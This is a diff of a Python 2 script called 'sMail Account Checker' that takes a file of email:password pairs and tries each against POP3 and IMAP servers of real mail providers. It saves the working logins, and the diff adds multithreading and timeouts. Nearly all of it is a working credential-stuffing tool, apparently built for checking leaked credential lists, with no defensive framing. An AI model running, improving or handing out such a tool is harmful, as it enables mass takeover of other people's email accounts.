@@ -9,14 +9,22 @@ import linecache
 import poplib
 import sys
 import time
+import xml_parser
+import Provider
+import threading
+import Queue
+import socket
 
 parser = argparse.ArgumentParser(description='This tool checks a given list for valid email accounts (testing default: POP3)')
 parser.add_argument('-f','--file', help='File with <email>:<pass> each line',required=False,default=None)
 parser.add_argument('-s','--sleep', help='Pause in seconds between each check',required=False,default=0)
 parser.add_argument('-p','--provider', help='Specify a provider -p [tag] (e.g. gmail.com)',required=False,default=None)
+parser.add_argument('-t','--threads', help='Specify the amount of threads to be used',required=False,default=1)
+parser.add_argument('-z','--timeout', help='Timeout for a try, default: 5sec',required=False,default=5)
 parser.add_argument('-o','--output', help='Filename to write output into',required=False,default=False)
 parser.add_argument('-n','--invalid', help='Filename to write invalid output into',required=False,default=False)
 parser.add_argument('-i','--imap', help='use IMAP first, then POP3 for unchecked. Some provider only offers IMAP.',required=False,action="store_true")
+parser.add_argument('-v','--verbose', help='Show Debug-msgs.',required=False,action="store_true")
 parser.add_argument('-l','--list', help='List all supported provider tags',required=False,action="store_true")
 parser.add_argument('-c','--colorize', help='Add color to output',required=False,action="store_true")
 
@@ -26,8 +34,13 @@ providers = []
 providers_imap = []
 accounts = []
 
+q = Queue.Queue()
+
 results = []
 invalid = []
+threads = []
+
+socket.setdefaulttimeout(int(args.timeout))
 
 class c:
     HEADER = ''
@@ -50,11 +63,12 @@ class c:
 
 def main():
 
+    addProvidersFromXML()
+
     print  c.HEADER+"[***************************]"
     print "[*  sMail Account Checker  *]"
     print "[***************************]"+c.ENDC
     print c.FAIL+"    ---- by m0nk3y ----"+c.ENDC
-    print c.UNDERLINE+"       KEEP SMILING :)\n\n"
     print "(Hint: Try this with colors -c)\n"
 
     if args.list:
@@ -66,6 +80,7 @@ def main():
         exit(1)
     print "[~] File: " + c.BOLD+ args.file + c.ENDC
     print "[~] Sleep: " + c.BOLD+ str(args.sleep) + c.ENDC
+    print "[~] Threads: " + c.BOLD+ str(args.threads) + c.ENDC
     try:
         parseEmails(args.file)
     except:
@@ -75,37 +90,81 @@ def main():
     time.sleep(2)
     print c.BOLD+c.WARNING+"[*] Testing Accounts"+c.ENDC
 
-    if len(accounts) > 0:
-        if args.imap:
-            testAccountsIMAP(providers_imap,args.sleep)
-        testAccounts(providers,args.sleep)
+    if len(accounts) > 0 and args.threads > 0:
 
+        for a in accounts:
+            q.put(a)
+
+        create_workers(args.threads)
+        #testAccounts(providers,args.sleep)
+
+        for t in threads:
+            t.join()
         printResult()
-
     else:
         print c.FAIL+c.BOLD+"\nCouldn't find any account in your file (wrong filename?)\n"+c.ENDC
-
-    exit(0)
-
+        print "-> "+args.file
 
 
+def create_workers(i):
+
+    for _ in range(int(i)):
+        t = threading.Thread(target=work)
+        threads.append(t)
+        #t.daemon = True
+        t.start()
 
 
 
+def work():
+    while True:
+
+        if q.qsize() < 1:
+            break
+
+
+        printl("Starting work")
+        acc = q.get()
+        size = q.qsize()
+        if q.qsize() % 50 == 0 and q.qsize() != 0:
+            print "[!] "+str(q.qsize())+" accounts to go!"
+
+        if len(acc) == 2:
+            email = acc[0]
+            passwd = acc[1]
+        else:
+            printl("no valid acc: "+str(acc))
+            return
+
+        for provider in providers:
+            services = provider.getServices()
+            domain = provider.getDomain()
+
+            if args.provider != None:
+                if domain != args.provider:
+                    continue
+
+            if "@"+domain not in email:
+                continue
+            printl(c.BOLD+"\n[*] Checking provider "+c.UNDERLINE+domain+c.ENDC + " for "+email)
+
+            for s in services:
+                    printl("testing services for domain: "+domain)
+                    if (login(s, email, passwd)):
+                        accounts.remove(acc)
+                        break
+        q.task_done()
+    return
+
+def printl(string):
+    if args.verbose:
+        print "[:Debug:] "+string
 
 def listProviders():
     global providers
     global providers_imap
 
-    print "\n[*] Supported POP3 Provider-Tags:"
-    for p in providers:
-        print p.tag
-
-    print "\n[*] Supported IMAP Provider-Tags:"
-    for pi in providers_imap:
-        print pi.tag
-
-    print "\n"+c.BOLD+c.OKGREEN+str(len(providers)+len(providers_imap))+" providers are supported. ("+str(len(providers))+" POP3 and "+str(len(providers_imap))+" IMAP)"+c.ENDC
+    print "\n"+c.BOLD+c.OKGREEN+str(len(providers))+" providers are supported. "+c.ENDC
 
 def printResult():
     global results
@@ -115,47 +174,173 @@ def printResult():
     for r in results:
         print r
 
+def login(service, email, passwd):
+
+    time.sleep(int(args.sleep))
+
+    printl ("Testing "+service.getHost()+" with "+ email + ":" + passwd)
+    type = service.getType()
+    port = service.getPort()
+    host = service.getHost()
+    printl ("Provider type: "+str(type)+" port: "+str(port))
+
+    acc = email+":"+passwd
+
+    if type == "pop3" and port == 995:
+        printl("Testing secure POP3 on "+str(port))
+
+        try:
+            pop = poplib.POP3_SSL(host, port)
+
+            pop.user(email)
+            pop.pass_(passwd)
+            pop.quit()
+            print c.BOLD+c.OKGREEN+"[!] "+email+"\t "+type+":"+str(port)+" success!"+c.ENDC
+
+            if acc not in results:
+                results.append(acc)
+                if args.output!=False:
+                    try:
+                        writeIntoFile(args.output, acc)
+                    except:
+                        PrintException()
+            pop.quit()
+            return True
+
+        except:
+            printl(c.FAIL+"[!] "+email+"\t "+type+":"+str(port)+" failed!"+c.ENDC)
+            if acc not in invalid:
+                invalid.append(acc)
+                if args.invalid!=False:
+                    try:
+                        writeIntoFile(args.invalid, acc)
+                    except:
+                        PrintException()
+
+    elif type == "pop3":
+
+        printl("Testing POP3 on "+str(port))
+        try:
+            pop = poplib.POP3(host, port)
+            pop.user(email)
+            pop.pass_(passwd)
+            pop.quit()
+            print c.BOLD+c.OKGREEN+"[!] "+email+"\t "+type+":"+str(port)+" success!"+c.ENDC
+
+            if acc not in results:
+                results.append(acc)
+                if args.output!=False:
+                    try:
+                        writeIntoFile(args.output, acc)
+                    except:
+                        PrintException()
+            pop.quit()
+            return True
+
+        except:
+            printl(c.FAIL+"[!] "+email+"\t on "+type+":"+str(port)+" failed!"+c.ENDC)
+            if acc not in invalid:
+                invalid.append(acc)
+                if args.invalid!=False:
+                    try:
+                        writeIntoFile(args.invalid, acc)
+                    except:
+                        PrintException()
+
+    elif type == "imap" and port == 993:
+        printl("Testing secure IMAP on "+str(port))
+        try:
+            mail = imaplib.IMAP4_SSL(host)
+            mail.login(email, passwd)
+            print c.BOLD+c.OKGREEN+"[!] "+email+"\t "+type+":"+str(port)+" success!"+c.ENDC
+            typ, data = mail.list()
+            #mail.close()
+            mail.logout()
+            if acc not in results:
+                results.append(acc)
+                if args.output!=False:
+                    try:
+                        writeIntoFile(args.output, acc)
+                    except:
+                        PrintException()
+            return True
+
+        except:
+            printl(c.FAIL+"[!] "+email+"\t "+type+":"+str(port)+" failed!"+c.ENDC)
+            if acc not in invalid:
+                invalid.append(acc)
+                if args.invalid!=False:
+                    try:
+                        writeIntoFile(args.invalid, acc)
+                    except:
+                        PrintException()
+
+    elif type == "imap":
+        printl("Testing IMAP on "+str(port))
+        try:
+            mail = imaplib.IMAP4(host)
+            mail.login(email, passwd)
+            print c.BOLD+c.OKGREEN+"[!] "+email+"\t "+type+":"+str(port)+" success!"+c.ENDC
+            typ, data = mail.list()
+            #mail.close()
+            mail.logout()
+            if acc not in results:
+                results.append(acc)
+                if args.output!=False:
+                    try:
+                        writeIntoFile(args.output, acc)
+                    except:
+                        PrintException()
+            return True
+
+        except:
+            printl(c.FAIL+"[!] "+email+"\t "+type+":"+str(port)+" failed!"+c.ENDC)
+            if acc not in invalid:
+                invalid.append(acc)
+                if args.invalid!=False:
+                    try:
+                        writeIntoFile(args.invalid, acc)
+                    except:
+                        PrintException()
+
+    else:
+        printl("no method for "+type+ " on " + str(port))
+
+    return False
+
 def testAccounts(providers,sleep):
     global results
     global invalid
     global accounts
 
     for provider in providers:
+        services = provider.getServices()
+        domain = provider.getDomain()
+
+        printl ("Domain: "+domain)
+
         if args.provider != None:
-            if provider.tag != args.provider:
+            if domain != args.provider:
                 continue
-        print c.BOLD+"\n[*] Checking POP3 for provider "+c.UNDERLINE+provider.tag+c.ENDC
+
         for acc in accounts:
             if len(acc) != 2:
                 continue
             email = acc[0]
             passwd = acc[1]
 
-            if email.find(provider.tag) == -1:
+            if domain not in email:
+                printl(domain + " not in "+email)
                 continue
-            #print "[-] Checking "+email
+            print c.BOLD+"\n[*] Checking provider "+c.UNDERLINE+domain+c.ENDC
+            printl("Checking "+email)
 
-            try:
-                pop = poplib.POP3_SSL(provider.server, provider.port)
-                pop.user(email)
-                pop.pass_(passwd)
-                print c.BOLD+c.OKGREEN+"[!] "+email+"\t success!"+c.ENDC
-                results.append(email+":"+passwd)
-                if args.output!=False:
-                    try:
-                        writeIntoFile(args.output, email+":"+passwd)
-                    except:
-                        PrintException()
-                pop.quit()
-                accounts.remove(acc)
-            except:
-                print c.FAIL+"[!] "+email+"\t failed!"+c.ENDC
-                invalid.append(email+":"+passwd)
-                if args.invalid!=False:
-                    try:
-                        writeIntoFile(args.invalid, email+":"+passwd)
-                    except:
-                        PrintException()
+            for s in services:
+                printl("testing services for domain: "+domain)
+                if (login(s, email, passwd)):
+                    accounts.remove(acc)
+                    break
+
 
             time.sleep(sleep)
 
@@ -205,7 +390,6 @@ def testAccountsIMAP(providers_imap, sleep):
 
             time.sleep(sleep)
 
-
 def parseEmails(file):
     global accounts
     with open(file,'r') as f:
@@ -223,15 +407,6 @@ def PrintException():
     line = linecache.getline(filename, lineno, f.f_globals)
     print 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)
 
-class Provider:
-    tag = None
-    server = None
-    port = None
-
-    def __init__(self, tag, server, port):
-        self.tag = tag
-        self.server = server
-        self.port = port
 
 def writeIntoFile(filename, value):
     global c
@@ -242,84 +417,23 @@ def writeIntoFile(filename, value):
     else:
         print c.FAIL+c.BOLD+"Error while creating File :: no content given"+c.ENDC
 
-class Provider:
-    tag = None
-    server = None
-    port = None
+def addProvidersFromXML():
 
-    def __init__(self, tag, server, port):
-        self.tag = tag
-        self.server = server
-        self.port = port
+    providers_xml = xml_parser.getProviders();
+    printl ("Adding from xml: " + str(len(providers_xml)))
+    for p in providers_xml:
+        services_provider = []
+        prov = Provider.Provider(p.getDisplayName(), p.getDomain())
+        services_provider = p.getIncomingServers()
+        for s in services_provider:
+            prov.setService(Provider.Service(s[0], s[1], s[2]))
 
-
-# List of Providers:
-providers.append(Provider("hs-weingarten.de", "mail.hs-weingarten.de", 995))
-providers.append(Provider("gmail.com", "pop.gmail.com", 995))
-providers.append(Provider("gmx.net", "pop.gmx.net", 995))
-providers.append(Provider("web.de", "pop3.web.de", 995))
-providers.append(Provider("1und1.de", "pop.1und1.de", 995))
-providers.append(Provider("a1.net", "pop.a1.net", 110))
-providers.append(Provider("alice.de", "pop3.alice.de", 110))
-providers.append(Provider("arcor.de", "pop3.arcor.de", 110))
-providers.append(Provider("chello.at", "pop.chello.at", 110))
-providers.append(Provider("compuserve.de", "pop.compuserve.de", 110))
-providers.append(Provider("drei.at", "pop3.drei.at", 995))
-providers.append(Provider("easyline.at", "pop.easyline.at", 110))
-providers.append(Provider("everyday.com", "virtual.everyday.com", 110))
-providers.append(Provider("freenet.de", "mx.freenet.de", 110))
-providers.append(Provider("upcbusiness.at", "mail.upcbusiness.at", 995))
-providers.append(Provider("kabelbw.de", "pop.kabelbw.de", 110))
-providers.append(Provider("kabelmail.de", "pop3.kabelmail.de", 110))
-providers.append(Provider("kabsi.at", "mail.kabsi.at", 110))
-providers.append(Provider("linzag.net", "pop.linzag.net", 110))
-providers.append(Provider("live.com", "pop3.live.com", 995))
-providers.append(Provider("liwest.at", "pop.liwest.at", 110))
-providers.append(Provider("o2mail.de", "mail.o2mail.de", 110))
-providers.append(Provider("o2online.de", "pop.o2online.de", 995))
-providers.append(Provider("t-online.de", "securepop.t-online.de", 995))
-providers.append(Provider("vodafone.de", "pop.vodafone.de", 995))
-providers.append(Provider("yahoo.com", "pop.mail.yahoo.com", 995))
-providers.append(Provider("yahoo.de", "pop.mail.yahoo.de", 995))
-providers.append(Provider("aol.com", "pop.aol.com", 110))
-providers.append(Provider("pop.aim.com", "pop.aim.com", 110))
-providers.append(Provider("firemail.de", "firemail.de", 110))
-providers.append(Provider("mail.de", "pop.mail.de", 995))
-providers.append(Provider("smart-mail.de", "pop.smart-mail.de", 110))
-providers.append(Provider("sxmail.de", "pop3.sxmail.de", 110))
-providers.append(Provider("unitybox.de", "mail.unitybox.de", 995))
-providers.append(Provider("strato.de", "pop3.strato.de", 110))
-
-
-providers_imap.append(Provider("hs-weingarten.de", "mail.hs-weingarten.de", 993))
-providers_imap.append(Provider("hotmail.com", "imap-mail.outlook.com", 993))
-providers_imap.append(Provider("live.com", "imap-mail.outlook.com", 993))
-providers_imap.append(Provider("live.de", "imap-mail.outlook.com", 993))
-providers_imap.append(Provider("outlook.com", "imap-mail.outlook.com", 993))
-providers_imap.append(Provider("1und1.de", "imap.1und1.de", 993))
-providers_imap.append(Provider("a1.net", "imap.a1.net", 143))
-providers_imap.append(Provider("alice.de", "imap.alice.de", 143))
-providers_imap.append(Provider("arcor.de", "imap.arcor.de", 993))
-providers_imap.append(Provider("drei.at", "imaps.drei.at", 993))
-providers_imap.append(Provider("freenet.de", "mx.freenet.de", 993))
-providers_imap.append(Provider("gmx.net", "imap.gmx.net", 993))
-providers_imap.append(Provider("gmail.com", "imap.gmail.com", 993))
-providers_imap.append(Provider("googlemail.com", "imap.gmail.com", 993))
-providers_imap.append(Provider("kabelbw.de", "imap.kabelbw.de", 143))
-providers_imap.append(Provider("kabsi.at", "imap.kabsi.at", 143))
-providers_imap.append(Provider("etcologne.de", "imap.netcologne.de", 993))
-providers_imap.append(Provider("o2mail.de", "mail.o2mail.de", 143))
-providers_imap.append(Provider("o2online.de", "imap.o2online.de", 143))
-providers_imap.append(Provider("cablelink.at", "mail.cablelink.at", 143))
-providers_imap.append(Provider("telering.at", "mail.telering.at", 993))
-providers_imap.append(Provider("t-online.de", "secureimap.t-online.de", 993))
-providers_imap.append(Provider("vodafone.de", "imap.vodafone.de", 993))
-providers_imap.append(Provider("web.de", "imap.web.de", 993))
-providers_imap.append(Provider("yahoo.de", "imap.mail.yahoo.de", 993))
-
-
+        providers.append(prov)
+        printl("added: "+ p.getDisplayName())
 
 
 
 # Here starts the magic :)
+start_time = time.time()
 main()
+print("--- %s seconds ---" % (time.time() - start_time))
